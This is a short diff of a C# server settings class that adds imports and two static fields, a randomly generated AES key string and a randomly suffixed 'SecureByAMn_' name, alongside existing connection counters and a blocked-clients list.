@@ -1,9 +1,11 @@
-﻿using Server.Algorithm;
+﻿using System;
+using Server.Algorithm;
 using Server.Connection;
 using System.Collections.Generic;
 using System.IO;
 using System.Security.Cryptography.X509Certificates;
 using System.Windows.Forms;
+using Server.Helper;
 
 namespace Server
 {
@@ -11,6 +13,9 @@ namespace Server
     {
         public static List<string> Blocked = new List<string>();
         public static object LockBlocked = new object();
+
+        public static string keyAesBase256Gcm = Methods.GetRandomString(16);
+        public static string nameSecureByAMn = "SecureByAMn_"+Methods.GetRandomString(new Random().Next(2, 5));
 
         public static long SentValue { get; set; }
         public static long ReceivedValue { get; set; }
